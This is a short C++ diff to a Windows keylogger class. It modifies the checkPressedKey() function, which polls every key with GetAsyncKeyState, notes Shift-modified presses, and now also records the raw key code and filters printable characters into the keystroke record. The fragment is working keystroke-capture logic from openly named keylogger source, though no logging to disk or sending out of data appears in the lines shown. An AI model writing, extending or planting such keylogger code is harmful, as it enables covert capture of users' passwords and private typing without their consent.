@@ -9,12 +9,14 @@ keyStroke keyLogger::checkPressedKey()
 {
     int keyStat = 0;    // Can be 0 if not pressed, 0x1 if pressed and 0x8000 if held.
     char keyChar = 0;   // Printable character.
+    int keyCode = 0;
     bool printable = false;
     bool shifted = false;
 
     for (int i = 0; i < NUM_OF_KEYS; i++)
     {
         keyStat = GetAsyncKeyState(i);
+        keyCode = i;
 
         // Check if a key was pressed with Shift.
         if ((keyStat & 0x1) && GetAsyncKeyState(VK_SHIFT) && i != VK_SHIFT && i != VK_RSHIFT && i != VK_LSHIFT)
@@ -37,6 +39,8 @@ keyStroke keyLogger::checkPressedKey()
 
     }
 
+    if (keyProcessor::filterPrintableChar(keyChar))
+        printable = true;
 
-    return keyStroke(printable, shifted, keyChar);
+    return keyStroke(printable, shifted, keyChar, keyCode);
 }
